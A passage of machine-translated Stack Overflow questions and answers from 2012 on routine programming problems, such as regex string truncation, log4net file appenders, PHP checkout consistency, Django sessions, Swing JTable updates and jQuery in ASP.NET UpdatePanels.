        }
        finalResult = tmp;
    }
    return finalResult;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T19:45:39.607

尝试

```
^(.{0,80})(?: |$) 
```

这是一个捕获贪心匹配，后面必须跟一个空格或字符串结尾。您还可以使用零宽度的前瞻断言，如

```
^.{0,80}(?= |$) 
```

如果您使用像[http://regexhero.net/tester/](http://regexhero.net/tester/)这样的实时测试工具，它非常酷，当您输入超过 80 个字符时，您实际上可以看到它跳回单词边界。

如果没有找到单词边界（空格），这里将简单地截断第 80 个字符：

```
^(.{1,80}(?: |$)|.{80}) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T19:33:45.210

这是一种不使用正则表达式的方法：只需将字符串（无论您喜欢如何）拆分为您认为“单词”的任何内容。然后，只需开始使用 a 将它们连接在一起`StringBuilder`，检查您想要的长度，直到您无法添加下一个“单词”。然后，只需返回您迄今为止建立的字符串。

（前面有未经测试的代码）

```
public string TruncateWithPreservation(string s, int len)
{
    string[] parts = s.Split(' ');
    StringBuilder sb = new StringBuilder();

    foreach (string part in parts)
    {
        if (sb.Length + part.Length > len)
            break;

        sb.Append(' ');
        sb.Append(part);
    }

    return sb.ToString();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:46:54.163

```
string truncatedText = text.Substring(0, 80);  // truncate to 80 characters
if (text[80] != ' ')  // don't remove last word if a space occurs after it in the original string (in other words, last word is already complete)
    truncatedText = truncatedText.Substring(0, truncatedText.LastIndexOf(' '));  // remove any cut-off words 
```

更新以修复评论中的问题，即使最后一个词完整，也可能被截断。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T19:43:09.143

这不是使用正则表达式，但我会这样做：

使用 String.LastIndexOf 获取第 81 个字符之前的最后一个空格。
如果第 81 个字符是一个空格，则将其保留到 80。
如果它返回一个数字 > -1，则将其从那里切断。
如果它是-1，那么你有一个非常长的词或有人在搞乱系统，所以你可以随心所欲。

# macos - 配置 git 命令时间

> ID：12646198
> 
> 赞同：0
> 
> 时间：2012-09-28T19:29:36.330
> 
> 标签：macos, git, mercurial, benchmarking, osx-mountain-lion

最近，在自定义提示时，我尝试对一些 git 命令进行基准测试（无济于事），以便找到最快的方法，例如获取 HEAD 分支名称。

现在，在添加对 Mercurial 的支持时，我注意到有一个`--profile`选项可以打印时间和 Mercurial 命令执行时执行的低级操作。

你知道类似 git 的东西吗？如果没有，我应该在哪里申请？

平台是 MacOs X 10.8.2。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:35:46.127

你用的是什么平台？对于 Linux 或 Mac OS X，您始终可以使用`time`命令。例如：

```
time git status 
```

# c++ - 布尔赋值运算符

> ID：12646199
> 
> 赞同：1
> 
> 时间：2012-09-28T19:29:41.013
> 
> 标签：c++, operators, boolean

我有一个方法，我在堆上创建对象并返回一个布尔值，指示它是否顺利。尽管在 (1) 中，我对我的布尔分配不是 100% 确定的；这是合法的吗？

```
 bool ret = true;

    if (ret = !mRenderBackend)     // make sure mRenderBackend is NULL
    {
        if (mEngineSettings.GetRenderBackend() == OPENGL)
            ret = mRenderBackend = mMemoryAllocator.AllocateObject<RenderOpenGL>();    // (1). AllocateObject returns either NULL or object address
        }

    return ret; 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:34:32.260

你根本不需要 bool，它有点让人难以理解。我个人会做类似的事情，

```
if (mRenderBackend == NULL)     // make sure mRenderBackend is NULL
{
    if (mEngineSettings.GetRenderBackend() == OPENGL)
        mRenderBackend = mMemoryAllocator.AllocateObject<RenderOpenGL>();    // (1). AllocateObject returns either NULL or object address
    }

return (mRenderBackend != NULL); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:35:53.833

是的，合法的。

```
if (ret = !mRenderBackend) 
```

相当于

```
ret = !mRenderBackend;
if(ret) 
```

相当于

```
ret = (mRenderBackend == 0);
if(ret) 
```

请注意，它`ret`只会被定义为在您的代码中看起来安全的零/非零。

# php - 创建订购和结帐系统，防止在付款过程中更改购物车

> ID：12646200
> 
> 赞同：5
> 
> 时间：2012-09-28T19:29:47.580
> 
> 标签：php, e-commerce

所以我有一个多页结账系统，它依赖会话来存储购物车的内容。我还使用第三方系统来处理信用卡，该系统在其服务器上托管实际支付页面。我只需要将最终总数发布到页面上。

我预见的问题是，如果有人点击进入托管支付页面，然后出于某种合法或邪恶的原因更改另一个选项卡中的购物车内容会怎样。我最初计划当托管支付页面重定向回我的收据页面时，我会将订单插入到我的数据库中。但是，如果此时更改会话，则订单将与收取的总费用不同。

有什么办法可以解决这个问题。我可以看到这种事情对于所有购物车系统都是一个问题，所以我想知道他们是如何做到的。

也许当用户单击按钮转到托管支付页面时，我可以在数据库的 temp_order 表中创建一个临时订单条目，然后当付款通过时，我可以将该临时记录转移到永久记录表中？这样我就不会从已更改的会话信息中插入记录。但是如果我必须发布到托管支付页面，我在哪里有机会将购物车保存到临时表？

此外，临时订单 ID 在临时表和永久表中必须是唯一的，因为我不希望有任何重叠。

最后，我应该经常清除临时订单表，因为它们只是临时记录。有些可能不会通过，因为用户可能会在托管的支付页面上改变主意。

我真的很困惑我该怎么做！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:35:19.150

我认为没有必要创建一个单独的表。例如，只需在现有表中添加一列， `payment_in_progress`并在客户向购物车提交任何更改时对其进行分析。

清除未处理的过期订单的要求仍然存在

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:43:51.250

当支付网关返回时，只需将收到的金额存储在购物车中，如果收到的金额少于总金额，则将它们放回支付页面，显示未支付的余额。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:41:10.253

除非支付系统在最终处理订单之前将控制权交还给您的网站，例如 PayPal Express Checkout，否则无法控制结帐流程。单向结账系统实际上是单向的。后续管理是手动的（通过付款收据）或由服务器到服务器的通知处理。

一旦您提交到其他网站，直接发布到支付网站不会给您任何控制权。最好的情况可能是您将订单作为 UNPAID 订单提交到您的数据库，然后提供一个页面，上面写着“您快完成了。继续付款。” -- 此时，您还应该清空客户的购物车，这样他们就无法更改处理中的订单（已在您的数据库中）。当支付系统重定向回您的网站时，您只需查找未付款的订单并将其标记为已付款。验证付款金额也是一个好主意，以防万一用户修改 POST 数据以减少付款。

**编辑：**
您可能真的需要一个支付网关解决方案，让您更好地控制结帐过程。您的担忧是真实的，但通常无法使用支付流程充分解决这些问题，这些支付流程无需先设置交易服务器端就直接将用户从您的网站发送出去。

# c++ - 我可以使用 ptr_vector 作为堆吗？

> ID：12646202
> 
> 赞同：1
> 
> 时间：2012-09-28T19:29:58.483
> 
> 标签：c++, sorting, boost, heap, ptr-vector

我想用 ptr_vector 替换用作堆（sort_heap）的 std:vector。[http://sourceforge.net/projects/ptr-vector/](http://sourceforge.net/projects/ptr-vector/)
上 ptr_vector 的作者提到使用 std 命名空间排序算法不是一个好主意，因为这会导致对象而不是指针的移动。他指的是 stdx:sort... 显然内置在 sourceforge 版本中的算法（可追溯到 2006 年）。 我在 ptr_vector 的 boost 实现中找不到后者。因此，如果我依赖于 boost ptr_vector （如何），我可以在不牺牲性能的情况下使用带有 sort_heap 的容器吗？

# c# - log4net 中的第二个附加程序不起作用

> ID：12646203
> 
> 赞同：3
> 
> 时间：2012-09-28T19:30:01.697
> 
> 标签：c#, log4net

我的 web.config 中有以下内容：

```
<log4net>
    <appender name="mainLog"
       type="log4net.Appender.FileAppender">
      <file value="Log/Log.txt" />
      <appendToFile value="true" />
      <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%newline%date [%thread] %-5level %logger - %message%newline" />
      </layout>
    </appender>
    <appender name="linqLog"
      type="log4net.Appender.FileAppender">
      <file value="Log/Log.txt" />
      <appendToFile value="true" />
      <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%message%newline" />
      </layout>
    </appender>

    <logger name="MainLogger">
      <level value="ALL" />
      <appender-ref ref="mainLog" />
    </logger>
    <logger name="LinqLogger">
      <level value="ALL" />
      <appender-ref ref="linqLog" />
    </logger>
  </log4net> 
```

第一个名为“mainLog”的附加程序正在工作。但是第二个叫做“linqLog”的不是。如果我注释掉“mainLog”，那么“linqLog”就可以了。

在我的 Global.asax 文件中，我有以下内容：

```
protected void Application_Start(object sender, EventArgs e)
        {
            XmlConfigurator.Configure();
        } 
```

我是这样称呼他们的：

```
public static void LogMessage(string message, string loggerName)
        {
            ILog log = LogManager.GetLogger(loggerName);
            log.Info(string.Format(message));
        }

LogMessage("My test message for MainLogger", "MainLogger");
LogMessage("My test message for LinqLogger", "LinqLogger"); 
```

任何想法我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:01:02.710

两个文件追加器不能记录到同一个文件，除非你指定一个`lockingModel`

`<lockingModel type="log4net.Appender.FileAppender+MinimalLock" />`

请参阅[http://logging.apache.org/log4net/release/config-examples.html](http://logging.apache.org/log4net/release/config-examples.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:59:38.640

Log4net 确实支持两个附加程序写入同一个文件，但您需要将锁定模型设置为“MinimalLock”。

```
<lockingModel type="log4net.Appender.FileAppender+MinimalLock" /> 
```

# python - 如何从子类调用不同类的实例？

> ID：12646211
> 
> 赞同：0
> 
> 时间：2012-09-28T19:30:36.097
> 
> 标签：python

这是我正在处理的代码：

```
from html import *
class Form(BlockContainer):
    def __init__(self, form):
        name = 'form'
        BlockContainer.__init__(self, name)
        self.addAttr('method', 'post')
        self.addAttr('action', form)

class Label(Container):
    def __init__(self, label):
        name = 'label'
        Container.__init__(self, name)
        self.addAttr('for', label)

class Input(Tag):
    def __init__(self, text, title):
        name = 'input'
        Tag.__init__(self, name)
        self.addAttr('type', text)
        self.addAttr('name', title)

class Box(Div):
    def __init__(self, text):
        Div.__init__(self)
        self.addAttr('class', 'box')
        self.addText(text)

class StatusBox(Box):
    def __init__(self, name):
        Box.__init__(self, name) 
```

好的，所以我尝试从 StatusBox 类中调用 Input、Label 和 Form 类。我试过这样称呼他们：

```
Class StatusBox(Box):
    def __init__(self, name):
        Box.__init__(self, name)
        Form('blahblablah')
        Label('okiedokie')
        Input('whatever','okay') 
```

但是当我这样称呼他们时，我什么也得不到。我从外壳构建这些类，它们按预期工作......

好的，所以从 shell 中，Form 应该返回这个：

```
 t = Form('/savedata')
    # t renders as: '\n<form method="post" action="/savedata" />' 
```

那么如何在 StatusBox 类中返回它呢？如果我分配给一个变量然后返回，我得到一个错误'构造函数应该返回 NONE'

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:39:52.693

您的实例被构建，然后立即被丢弃，因为它们没有存储在变量中。

# java - 使用 SHA1 哈希生成电子邮件附件

> ID：12646217
> 
> 赞同：1
> 
> 时间：2012-09-28T19:30:56.863
> 
> 标签：java, sha1

我需要生成包含两个附件的多部分电子邮件：一个附件是带有消息的纯文本文件，另一个附件应包含 SHA1 哈希以验证消息的完整性。我可以生成附件和 SHA1 哈希，但是当我使用外部工具 (sha1sum) 为带有消息的附件生成 SHA1 时，它与代码中生成的 SHA1 不匹配。

这是我生成附件和 SHA1 的代码：

```
String tx = "Some message";

// generate message attachment
MimeBodyPart attachment = new MimeBodyPart();
attachment.setDisposition(MimeBodyPart.ATTACHMENT);
attachment.setFileName("myFileName.txt");
attachment.setDataHandler(
    new DataHandler(
        new ByteArrayDataSource(tx, "text/plain")));

// generate SHA1 hash
MessageDigest sha1 = MessageDigest.getInstance("SHA1");
sha1.update(tx.getBytes("ISO-8859-1"));
String hashString = Hex.encodeHexString(sha1.digest()); // using Apache Commons

// generate SHA1 attachment
MimeBodyPart hash = new MimeBodyPart();
hash.setDisposition(MimeBodyPart.ATTACHMENT);
hash.setFileName("myFileName.sha1");
hash.setDataHandler(
    new DataHandler(
        new ByteArrayDataSource(hashString, "text/plain"))); 
```

我的问题是：为什么我生成的 SHA1 哈希与附件文件的 SHA1 哈希不匹配？

# android - 具有给定硬件配件、传感器等的设备统计信息？

> ID：12646221
> 
> 赞同：4
> 
> 时间：2012-09-28T19:31:35.707
> 
> 标签：android, configuration, keyboard, hardware

有一个[Android 仪表板](http://developer.android.com/about/dashboards/index.html)，可按操作系统、屏幕尺寸和密度提供统计信息。

但是，我想获取带有物理键盘、前置摄像头等设备的数据。这些信息是否在某处收集和发布？

![在此处输入图像描述](../Images/0a4ebfc7f281d3b1ac1e804ebe9cd4b2.png)

# c++ - 将键值对文件读入 std::map

> ID：12646222
> 
> 赞同：4
> 
> 时间：2012-09-28T19:31:40.827
> 
> 标签：c++, map, boost-iterators

我有一个 Visual Studio 2008 C++03 项目，我想在其中将键值对文件读入 std::map。为此，我创建了`istreambuf_pair_iterator`如下：

```
typedef std::map< std::string, std::string > Properties;

class istreambuf_pair_iterator : 
    public boost::iterator_adaptor< istreambuf_pair_iterator, 
                                    std::pair< std::string, std::string >*,
                                    boost::use_default, 
                                    boost::forward_traversal_tag >
{
public:
    istreambuf_pair_iterator() : sb_( 0 ) { };
    explicit istreambuf_pair_iterator( std::istream& is ) : sb_( is.rdbuf() ) { };

    private:
    void increment()
    {
        std::string line;
        std::istream is( sb_ );
        std::getline( is, line );

        // TODO: parse the key=value to a std::pair 
        // where do I store the pair???
    };

    friend class boost::iterator_core_access;
    std::streambuf* sb_;
};

Properties ReadProperties( const char* file )
{
    std::ifstream f( file );
    Properties p;
    std::copy( istreambuf_pair_iterator( f ),
               istreambuf_pair_iterator(),
               std::inserter( p, p.end() ) );
    return p;
} 
```

一旦我`std::pair<>`从文件中读取了字符串，我应该将它存储在哪里，以便它可以通过`std::inserter`in 插入到`std::map`?

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-28T20:34:12.930

为什么对可以用 C++ std 东西实现的任务使用 boost？只需将 istream_iterator 与 insert_iterator 一起使用。为此，您必须在 std 命名空间流`<<`和 '>>' 运算符中为`pair<string,string>`. 像这样的东西：

```
namespace std {
// I am not happy that I had to put these stream operators in std namespace.
// I had to because otherwise std iterators cannot find them 
// - you know this annoying C++ lookup rules...
// I know one solution is to create new type inter-operable with this pair...
// Just to lazy to do this - anyone knows workaround?
istream& operator >> (istream& is, pair<string, string>& ps)
{
   return is >> ps.first >> ps.second;
}
ostream& operator << (ostream& os, const pair<const string, string>& ps)
{
   return os << ps.first << "==>>" << ps.second;
}
} 
```

以及用法：

标准插入迭代器：

```
 std::map<std::string, std::string> mps;
  std::insert_iterator< std::map<std::string, std::string> > mpsi(mps, mps.begin()); 
```

标准 istream 迭代器：

```
 const std::istream_iterator<std::pair<std::string,std::string> > eos; 
  std::istream_iterator<std::pair<std::string,std::string> > its (is); 
```

阅读：

```
 std::copy(its, eos, mpsi); 
```

写作（奖金）：

```
 std::copy(mps.begin(), mps.end(),   std::ostream_iterator<std::pair<std::string,std::string> >(std::cout, "\n")); 
```

[ideone 的工作示例](http://ideone.com/ZbqWI)

# django - Django 表单请求 KeyError

> ID：12646225
> 
> 赞同：1
> 
> 时间：2012-09-28T19:31:48.533
> 
> 标签：django, django-forms, django-views

我有`MyModel`如下所列的模型。当我提交表单时`/`，我得到了一个`KeyError`异常`/add`值`name`。根据调试器，错误在这一行中`views.form_add`：

```
name = request.session['name'] 
```

怎么了？

### myapp/models.py

```
class MyModel(models.Model):
    name = models.CharField(max_length=50) 
```

### 我的应用程序/forms.py

```
class MyModelForm(ModelForm):
    class Meta:
        model = MyModel 
```

### 我的应用程序/urls.py

```
urlpatterns = patterns('myapp.views',
    url(r'^$', 'main'),
    url(r'^add/', 'form_add'),
) 
```

### 我的应用程序/views.py

```
def main(request):
    if request.method == 'POST':
        form = MyModelForm(request.POST)
        if form.is_valid():
            name = form.cleaned_data['name']
        return HttpResponseRedirect('/add') # Redirect after POST
    else:
        form = MyModelForm()
        args = {}
        args['form'] = form
    return render(request, 'main.html', args)

def form_add(request):
    args = {}
    name = request.session['name']
    args['name'] = name
    mm = MyModel(name=name)
    mm.save()

    return render(request, 'add.html', args) 
```

### 模板/main.html

```
<form method="POST" id="" action="">
  {% csrf_token %}
  {{ form.as_p }}
  <button>Submit</button>
</form> 
```

### 模板/add.html

```
<p>{{ name }}</p> 
```

* * *

## 第 1 版

### myproject/settings.py（模板上下文处理器）

```
TEMPLATE_CONTEXT_PROCESSORS = (
    'django.contrib.auth.context_processors.auth',
    'django.contrib.messages.context_processors.messages',
    'django.core.context_processors.static',
    ) 
```

## 第 2 版 - 已解决

我重写了我的`main`保存功能`MyModel`，`request.session['name']`如下所示。

```
def main(request):
    if request.method == 'POST':
        form = MyModelForm(request.POST)
        if form.is_valid():
            name = form.cleaned_data['name']
            # I added the lines below to create MyModel and request
            request.session['name'] = name
            mm = MyModel.objects.create(name=name)
            mm.save()
            # the indentation was wrong
            return HttpResponseRedirect('/add') # Redirect after POST
    else:
        form = MyModelForm()
    # the indentation was wrong
    args = {}
    args['form'] = form
    return render(request, 'main.html', args) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:49:56.400

这是非常奇怪的代码。当您的表单提交时，如果它是有效的，您将`name`值放入一个变量*中，该变量会立即被丢弃*。您不保存表单，而是再次丢弃这些值。无论表单是否有效，您都会立即重定向到`add/`URL，在该 URL 中假设`name`会话中有一个值，尽管之前从未将任何内容保存到会话中。

您的基本问题是会话中没有`name`密钥，但是鉴于您显示的代码，我对您为什么认为会有密钥感到困惑。

# objective-c - 如何观察 NSMutableArray 中包含的动态数量的 NSMutableArrays 的插入和删除？

> ID：12646226
> 
> 赞同：0
> 
> 时间：2012-09-28T19:31:50.280
> 
> 标签：objective-c, ios

我有一种情况，我有一个要被子类化的类，我们称之为“SuperClass”。这个类有一个成员，我们称之为“数组”。SuperClass 的子类将添加数组作为“数组”的成员。SuperClass 需要能够：

a) 知道何时将子数组添加到“数组”中，并将自己作为观察者添加到子数组中

b) 知道这些子数组何时被修改（插入和删除）并能够做出相应的响应。

有没有一种特殊的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:54:01.063

每次添加或删除新对象时，您都可以使用 NSNotificationCenter 发布通知。但是您需要继承 NSMutableArray。
为主数组（包含子数组的那个）创建一个 NSMutableArray 的子类，覆盖 inserObject:atIndex 方法并发布一个通知，您可以调用 @"subarray inserted" 例如。
您需要 NSmutableArray 的另一个子类来覆盖 insertObject:atIndex 和 removeObject:atIndex 以使用另一个名称发布通知。
如果您需要代码示例，请告诉我。

# ruby-on-rails - 我可以在rails link_to上使用带有红宝石条件的编辑路径吗？

> ID：12646230
> 
> 赞同：0
> 
> 时间：2012-09-28T19:32:04.053
> 
> 标签：ruby-on-rails, routing, link-to, restful-url

我想创建一个带有条件的 link_to 标记，例如：

**下面的代码可能不起作用......不要尝试**

```
link_to "Edit postal address", edit_postal_address_path( :condition => {:organization_id => @organization_id } ) 
```

我想用我在变量中的 organization_id 编辑邮政地址。有没有一种巧妙的方法可以做到这一点，还是我必须走很长的路？

我希望这是有道理的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:43:27.837

```
link_to "Edit postal address", edit_postal_address_path( PostalAddress.where("organization_id = ?", @organization_id) 
```

这种关系应该是每个组织的`has_one`PostalAddress

# javascript - 电子邮件正则表达式 Javascript

> ID：12646235
> 
> 赞同：-2
> 
> 时间：2012-09-28T19:32:37.000
> 
> 标签：javascript, regex, email

我有一个电子邮件正则表达式。但我只想`@`在正则表达式中的符号前允许 1 到 20 个字符。

```
([\w-\"]+(?:\.[\w-\"]+))@((?:[\w-]+\.)*\w[\w-]{0,255})\.([a-z]{2,6}(?:\.[a-z]{2})?) 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:37:25.657

您最好在正则表达式之外进行检查，但在这种特定情况下碰巧有一种方法：

```
(?=[^@]{1,20}@)([\w-\"]+(?:\.[\w-\"]+))@... 
```

# elasticsearch - 本地网关使用索引内存存储的陷阱

> ID：12646238
> 
> 赞同：2
> 
> 时间：2012-09-28T19:32:55.910
> 
> 标签：elasticsearch

我阅读了[http://www.elasticsearch.org/guide/reference/index-modules/store.html](http://www.elasticsearch.org/guide/reference/index-modules/store.html)并想更改我的设置以将索引加载到内存与磁盘中，但在该页面上它说

“当使用本地网关（默认）时，需要没有内存存储的文件系统存储来保持索引一致性。这是必需的，因为本地网关从每个节点的本地索引状态构造其状态。”

我们现在只有一个节点在运行，所以我想知道我是否仍然可以这样做来提高性能。只是想看看这样做是否有一些我没有考虑的真正后果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:24:58.483

如果您将使用内存存储和本地网关创建索引，则该索引将在下一次集群重新启动后消失。我认为您正在寻找的是[具有内存缓存的文件系统存储](https://github.com/elasticsearch/elasticsearch/issues/82)。

# java - Jtable 不刷新/更新数据

> ID：12646240
> 
> 赞同：2
> 
> 时间：2012-09-28T19:32:57.627
> 
> 标签：java, swing, jtable, jscrollpane, defaulttablemodel

我有`JTable`/的问题`JScrollPane`。我的数据表没有刷新/更新。我正在使用`DefultTableModel`，根据代码一切都很好，我没有任何错误。另外我有一个带有分页的表格，这就是为什么我使用动作监听器和按钮“prev”和“next”。我正在从其他函数传递到在 where is 类中编码的函数 `JTable`。问题是我填充了包含表格数据的数组，但表格不会更新/刷新它。这是我的代码。提前谢谢。

**大编辑**旧代码已删除。我添加了新代码，可以帮助你们了解我遇到的问题。希望这会有所帮助。问候。

首先是显示 gui 的类：

```
import javax.swing.*;
public class Glavni {
public static void main(String[] args)  {
    // TODO Auto-generated method stub
    SwingUtilities.invokeLater(new Runnable() {
        public void run() {
                gui Scanner = new gui();
                Scanner.setVisible(true);
        }
    });
}

} 
```

第二个是将String传递给包含jtable的gui类的类

```
public class passDatatoTable {
public void passData(){
    String str1,str2,str3,str4;
    gui SendStringsToGUI = new gui();
    for (int i =0;i<=10;i++){
            str1="Column 1 of row: "+i;
            str2="Column 2 of row: "+i;
            str3="Column 3 of row: "+i;
            str4="Column 4 of row: "+i;
            SendStringsToGUI.WriteMonitorData(str1, str2, str3, str4);

    }
  }
} 
```

接下来是gui（构造函数）的声明：

```
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class gui extends JFrame implements ActionListener {
private static final long serialVersionUID = 1L;
 String[][] data = new String[100][4];

 String[] columnNames = new String[]{
         "IP", "PC_NAME", "ttl", "db"
 };
 DefaultTableModel model = new DefaultTableModel(data,columnNames);

    JTable table =  new JTable(model);
    JScrollPane scrollPane = new JScrollPane(table);
    int i=0;
public void WriteMonitorData (String IP, String PC_NAME, String ttl, String gw)
{
    System.out.println(IP);//just for testing (check if data was passed)
    model.setValueAt(IP, i, 0);
    model.setValueAt(PC_NAME, i, 1);
    model.setValueAt(ttl, i, 2);
    model.setValueAt(gw, i, 3);

    i++;
    model.fireTableDataChanged();
    table.repaint();
    scrollPane.repaint();

}   
gui(){

JButton addData= new JButton("Add Data");
JButton next = new JButton("next");
JButton prev = new JButton("prev");
addData.addActionListener(this);
next.addActionListener(this);
prev.addActionListener(this);
JPanel panel = new JPanel(new BorderLayout());
JPanel buttonPanel = new JPanel();
buttonPanel.add(addData);
buttonPanel.add(prev);
buttonPanel.add(next);
panel.add(buttonPanel, BorderLayout.SOUTH);
panel.add(table.getTableHeader(), BorderLayout.PAGE_START);
panel.add(scrollPane, BorderLayout.CENTER);
getContentPane().add(panel);
} 
```

这是动作监听器：

```
public void actionPerformed(ActionEvent e) {
if ("Add Data".equals(e.getActionCommand())){

        passDatatoTable passSomeData = new passDatatoTable();
        passSomeData.passData();
              }
 if ("next".equals(e.getActionCommand())) {
         Rectangle rect = scrollPane.getVisibleRect();
         JScrollBar  bar = scrollPane.getVerticalScrollBar();
         int blockIncr = scrollPane.getViewport().getViewRect().height;
             bar.setValue(bar.getValue() + blockIncr);
             scrollPane.scrollRectToVisible(rect);
     }
     if ("prev".equals(e.getActionCommand())) {
         Rectangle rect = scrollPane.getVisibleRect();
         JScrollBar  bar = scrollPane.getVerticalScrollBar();
         int blockIncr = scrollPane.getViewport().getViewRect().height;
             bar.setValue(bar.getValue() - blockIncr);
             scrollPane.scrollRectToVisible(rect);
     }

  } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T19:40:58.110

您的第一个片段显示了这一点：

`JTable table = new JTable(model);`

但您的`gui()`构造函数显示：

`JTable table = new JTable(data, columnNames);`

您启动表两次。一旦使用`TableModel`( [`JTable(TableModel tm)`](http://docs.oracle.com/javase/1.5.0/docs/api/javax/swing/JTable.html#JTable%28javax.swing.table.TableModel%29)) 下一次使用[`JTable(int rows,int cols)`](http://docs.oracle.com/javase/1.5.0/docs/api/javax/swing/JTable.html#JTable%28int,%20int%29)this 不好，`JTable`在构造函数中启动一次：

```
gui() {
DefaultTableModel model = new DefaultTableModel(data,columnNames);
JTable table =  new JTable(model);
JScrollPane scrollPane = new JScrollPane(table);

JButton next = new JButton("next");
JButton prev = new JButton("prev");
next.addActionListener(this);
prev.addActionListener(this);
JPanel panel = new JPanel(new BorderLayout());
JPanel buttonPanel = new JPanel();
buttonPanel.add(prev);
buttonPanel.add(next);
panel.add(buttonPanel, BorderLayout.SOUTH);
panel.add(table.getTableHeader(), BorderLayout.PAGE_START);
panel.add(scrollPane, BorderLayout.CENTER);
getContentPane().add(panel);
} 
```

**更新：**

这是一个示例，该线程将在 UI 可见后 2.5 秒启动并更改 的值`JTable`：

```
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;

public class Test extends JFrame {

    public static void main(String[] args) throws Exception {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                new Test().createAndShowUI();
            }
        });

    }

    private void createAndShowUI() {
        JFrame frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        initComponents(frame);
        frame.pack();
        frame.setVisible(true);
        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    Thread.sleep(2500);
                } catch (InterruptedException ex) {
                    Logger.getLogger(Test.class.getName()).log(Level.SEVERE, null, ex);
                } 
                SwingUtilities.invokeLater(new Runnable() {

                     @Override
                     public void run() {
                       model.setValueAt("hello", 0, 0);
                     }
                });
            }
        }).start();
    }
    static DefaultTableModel model;

    private void initComponents(JFrame frame) {

        String data[][] = {
            {"1", "2", "3"},
            {"4", "5", "6"},
            {"7", "8", "9"},
            {"10", "11", "12"}
        };

        String col[] = {"Col 1", "Col 2", "Col 3"};

        model = new DefaultTableModel(data, col);
        JTable table = new JTable(model);

        frame.getContentPane().add(new JScrollPane(table));
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T21:05:50.707

根据我从评论和问题中了解到的情况，您首先`DefaultTableModel`通过在构造函数中将数据作为数组传递来创建

```
String[][] data = new String[100][4];
String[] columnNames = new String[]{
     "IP", "PC_NAME", "ttl", "db"};
DefaultTableModel model = new DefaultTableModel(data,columnNames); 
```

然后您尝试通过调整这些数组来修改表格。这永远不会有任何影响，因为`DefaultTableModel`不使用这些数组。这可以在该类的源代码中看到

```
public DefaultTableModel(Object[][] data, Object[] columnNames) {
    setDataVector(data, columnNames);
} 
```

最终归结为

```
protected static Vector convertToVector(Object[][] anArray) {
    if (anArray == null) {
        return null;
    }
    Vector<Vector> v = new Vector<Vector>(anArray.length);
    for (Object[] o : anArray) {
        v.addElement(convertToVector(o));
    }
    return v;
} 
```

所以数组的所有元素都被复制到一个内部`Vector`，不再使用该数组。

解决方案：不要更新数组，而是更新`DefaultTableModel`. 该类提供了向其中添加/删除数据所需的所有 API。

# jquery - 使用 jQuery 时可以在 UpdatePanel 中放置控件吗？

> ID：12646247
> 
> 赞同：0
> 
> 时间：2012-09-28T19:33:26.453
> 
> 标签：jquery, asp.net

使用此 jQuery 代码，我试图在单击时选择控件内的文本。

```
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <script src="Scripts/jquery-1.4.1.js" type="text/javascript"></script>
    <script type="text/javascript">

        jQuery(document).ready(
            function () {
                jQuery("input[type='text']").click(function () {
                    this.select();
                });
            });  

    </script>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:TextBox Text="Text 1" ID="txt1" ClientIDMode="Static" runat="server" />
        <asp:Button Text="Submit" ID="btn1" OnClick="btn1_Click" runat="server" />
        <asp:TextBox Text="Text 2" ID="txt2" ClientIDMode="Static" Visible="false" runat="server" />
    </div>
    </form>
</body>
</html> 
```

**代码背后：**

```
protected void btn1_Click(object sender, EventArgs e)
    {
        txt2.Visible = true;
    } 
```

问题是当我将页面内容放入 UpdatePanel 时，jQuery 第一次在 txt1 上运行。单击按钮时，它不适用于任何文本框。

```
 <asp:UpdatePanel runat="server">
        <ContentTemplate>
            <asp:TextBox Text="Text 1" ID="txt1" ClientIDMode="Static" runat="server" />
            <asp:Button Text="Submit" ID="btn1" OnClick="btn1_Click" runat="server" />
            <asp:TextBox Text="Text 2" ID="txt2" ClientIDMode="Static" Visible="false" runat="server" />
</ContentTemplate>
    </asp:UpdatePanel> 
```

在使用 Chrome 控制台进行调试时，我发现 jQuery 没有定义 - 奇怪 :-( 你能建议可能出现的问题吗？

感谢您的时间。

**编辑：**根据您的回复，我尝试遵循这些解决方案，对我来说都很好。

将事件绑定到 form1，并将其包含在准备好的文档中。

> ```
> > jQuery(document).ready(
> >       function () {
> >           jQuery("#form1").on("click", "input[type='text']", function () {
> >               this.select();
> >           });
> >       }); 
> ```

将事件绑定到文档本身 -

> jQuery(document).on("click", "input[type='text']" ,function () { this.select(); });

